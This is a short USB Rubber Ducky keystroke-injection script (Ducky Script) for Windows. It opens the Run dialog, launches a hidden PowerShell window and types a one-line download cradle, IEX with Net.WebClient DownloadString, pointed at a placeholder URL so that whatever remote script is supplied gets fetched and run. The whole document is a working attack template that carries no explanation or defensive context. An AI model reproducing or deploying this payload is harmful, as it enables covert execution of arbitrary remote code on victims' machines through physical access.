DELAY 1005
GUI r
DELAY 65
STRING powershell -WindowStyle hidden
ENTER
DELAY 1005
STRING IEX (New-Object Net.WebClient).DownloadString('directory of your file/URL')
ENTER